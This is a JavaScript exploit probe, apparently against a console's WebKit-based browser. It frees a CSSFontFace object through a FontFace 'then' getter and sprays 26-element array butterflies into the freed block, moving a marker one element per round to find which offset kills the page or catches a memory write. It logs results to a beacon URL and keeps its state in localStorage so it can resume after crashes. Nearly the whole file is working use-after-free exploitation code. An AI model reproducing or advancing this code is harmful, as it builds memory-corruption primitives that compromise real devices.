// p459-butterfly v2 — map the freed CSSFontFace block one element at a time
// Beacon prefix: V459-
//
// v1 result: butterfly spray into the freed slot KILLS the page (BOOT ->
// R1-GO -> death, repeated). Trigger alone never died (p457, ~600 rounds);
// raw ArrayBuffers never died (p458); butterflies die. So butterflies DO
// claim the block — reoccupancy and size class are proven — but at least
// one field the frame reads after the free lies OUTSIDE v1's zero band
// (elements 4-13). Guessing bands again would be the same mistake twice.
//
// v2 measures instead: every array is all 0.0 (eight zero bytes per
// element — empty Vector / empty WeakHashSet / idle Timer, safe to walk)
// except ONE marker element whose position advances one per round.
//   cfg 0      : all-zero baseline. If this dies too, death is not from
//                the elements we control -> park and rethink.
//   cfg k(1..26): marker at element k-1 in all 200 arrays.
//     - page dies           -> the frame reads something at that offset:
//                              killer offset MAP (that's the answer)
//     - marker VALUE changed -> the m_status=3 write landed there:
//                              the primitive, caught in JS-visible data
//     - survives unchanged  -> offset is inert; advance
// Config state lives in localStorage so a page death mid-round resumes
// past the killer: a boot with the ran-flag set marks the previous cfg
// as KILL.
//
// Loop guard: >25 page boots in 10 minutes = crash-looping -> park the
// probe (the console's auto-restore is what leaks memory; never let it
// spin). Zero reloads otherwise: surviving rounds advance configs
// in-page, 8s apart. OOM guard parks before any console dialog.
(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V459-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  var CAP = 26;        // capacity-26 arrays -> 224-byte butterflies
  var SPRAY = 200;
  var ROUND_MS = 8000;
  var OK = 'local(Helvetica)';

  // ---------- schedule state (survives page death) ----------
  var cfg = 0;         // 0 = all-zero baseline; 1..CAP = marker at elem cfg-1
  try { cfg = parseInt(localStorage.getItem('p459b') || '0', 10); } catch(e) {}
  if (!(cfg >= 0 && cfg <= CAP)) cfg = 0;

  var ran = 0;         // 1 = a round with this cfg started but no SURVIVED yet
  try { ran = parseInt(localStorage.getItem('p459ran') || '0', 10); } catch(e) {}
  if (ran === 1) {
    // we booted while a round was in flight: that cfg killed the page.
    // Attended mode: advance past the killer and PARK — exactly one
    // auto-restore per killer offset, then the page is stable and waits
    // for a human re-entry. Never let auto-restore chain rounds.
    B('KILL-cfg' + cfg);
    if (cfg === 0) { park('baseline all-zero also kills — elements are not the death cause'); return; }
    cfg = cfg + 1;
    if (cfg > CAP) { park('map complete — see beacons'); return; }
    store('p459b', cfg);
    store('p459ran', 0);
    park('killer was element ' + (cfg - 1) + ' — back out, re-enter guide to continue');
    return;
  }

  // ---------- loop guard ----------
  var boots = 0;
  try {
    var t0 = parseInt(localStorage.getItem('p459bt') || '0', 10);
    var now = Date.now();
    if (now - t0 > 600000) boots = 1;
    else boots = (parseInt(localStorage.getItem('p459bc') || '0', 10) || 0) + 1;
    store('p459bt', now);
    store('p459bc', boots);
  } catch(e) {}
  if (boots > 25) { park('loop guard — console is crash-looping (' + boots + ' boots/10min)'); return; }

  var hb = document.createElement('pre');
  hb.style.cssText = 'position:fixed;top:8px;left:8px;color:#0f0;background:#000;padding:6px;font:12px monospace;z-index:9';
  document.body.appendChild(hb);

  window.onerror = function(msg) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 80));
    return false;
  };

  function store(k, v) { try { localStorage.setItem(k, String(v)); } catch(e) {} }

  B('BOOT-cfg' + cfg + '-b' + boots);

  var arrays = [];
  var stopped = false;
  var roundNo = 0;

  function marker(i, j) { return i * 4096 + j + 0.5; }
  function markerIdx() { return cfg === 0 ? -1 : cfg - 1; }
  function expected(i, j) { return j === markerIdx() ? marker(i, j) : 0; }

  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      var v = document.getElementById('v');
      if (v) {
        v.remove();
        document.body.offsetHeight;      // free happens here
        arrays = [];
        try {
          for (var i = 0; i < SPRAY; i++) {
            var a = new Array(CAP);
            for (var j = 0; j < CAP; j++) a[j] = expected(i, j);
            arrays.push(a);
          }
        } catch (e) {
          B('OOMGUARD');
          park('allocation failed — parked before any console error');
          return;
        }
      }
      return undefined;
    },
    configurable: true
  });

  function park(msg) {
    stopped = true;
    try {
      hb.textContent = 'p459 STOPPED: ' + msg;
      hb.style.color = '#ff0';
    } catch(e) {}                          // hb may not exist yet on boot paths
    B('PARK-' + encodeURIComponent(String(msg).slice(0, 60)));
  }

  function cleanup() {
    try {
      var st = document.querySelectorAll('style');
      for (var i = 0; i < st.length; i++) st[i].remove();
      document.fonts.forEach(function(f) { try { document.fonts.delete(f); } catch(e) {} });
    } catch(e) {}
    arrays = [];
  }

  function scan() {
    // every element must equal expectation: zeros stay zero (a nonzero
    // there is the write landing on a zero slot — as good as a marker),
    // the marker (if any) keeps its exact value
    var hits = [], total = 0;
    for (var i = 0; i < arrays.length; i++) {
      var a = arrays[i];
      if (a.length !== CAP) { hits.push('LEN-a' + i + '=' + a.length); total++; continue; }
      for (var j = 0; j < CAP; j++) {
        var v = a[j];
        if (typeof v !== 'number') { hits.push('TYPE-a' + i + '-' + j); total++; continue; }
        if (v !== expected(i, j)) {
          if (hits.length < 4) hits.push('a' + i + '-e' + j + '=' + v.toPrecision(17));
          total++;
        }
      }
    }
    return { hits: hits, total: total };
  }

  function findFace(fam) {
    var found = null;
    document.fonts.forEach(function(f) {
      if (f.family.replace(/['"]/g, '') === fam) found = f;
    });
    return found;
  }

  function round() {
    if (stopped) return;
    roundNo++;
    hb.textContent = 'p459 cfg' + cfg + (cfg === 0 ? ' (all-zero)' : ' (marker@e' + (cfg - 1) + ')') + ' round ' + roundNo;
    B('GO-cfg' + cfg);
    store('p459ran', 1);                  // dies here -> next boot marks KILL

    var victim = document.createElement('style');
    victim.id = 'v';
    victim.textContent = 'x{}';
    document.head.appendChild(victim);

    var fs = document.createElement('style');
    fs.textContent = '@font-face { font-family: g0; src: ' + OK + '; }';
    document.head.appendChild(fs);
    document.body.offsetHeight;

    var face = findFace('g0');
    if (!face) {
      B('NOFACE-cfg' + cfg);
      store('p459ran', 0);
      cleanup();
      setTimeout(round, ROUND_MS);
      return;
    }

    void face.loaded;
    face.load().then(
      function() {
        if (stopped) return;
        store('p459ran', 0);
        var r = scan();
        if (r.total > 0) {
          // the write landed in JS-visible data — the primitive
          B('MARKER-cfg' + cfg + '-' + r.hits.join('|'));
          B('TOTAL-' + r.total);
          hb.textContent = 'p459 CORRUPTION: ' + r.hits.join(' ');
          hb.style.color = '#0ff';
          return;                          // keep arrays alive, stop sweeping
        }
        B('SURV-cfg' + cfg);
        cleanup();
        cfg = cfg + 1;
        if (cfg > CAP) { park('map complete — all 26 offsets inert'); return; }
        store('p459b', cfg);
        hb.textContent = 'p459 cfg' + cfg + ' clean — next in 8s';
        setTimeout(round, ROUND_MS);
      },
      function() {
        if (stopped) return;
        store('p459ran', 0);
        B('NO0-cfg' + cfg);
        cleanup();
        setTimeout(round, ROUND_MS);
      }
    );
  }

  round();
})();
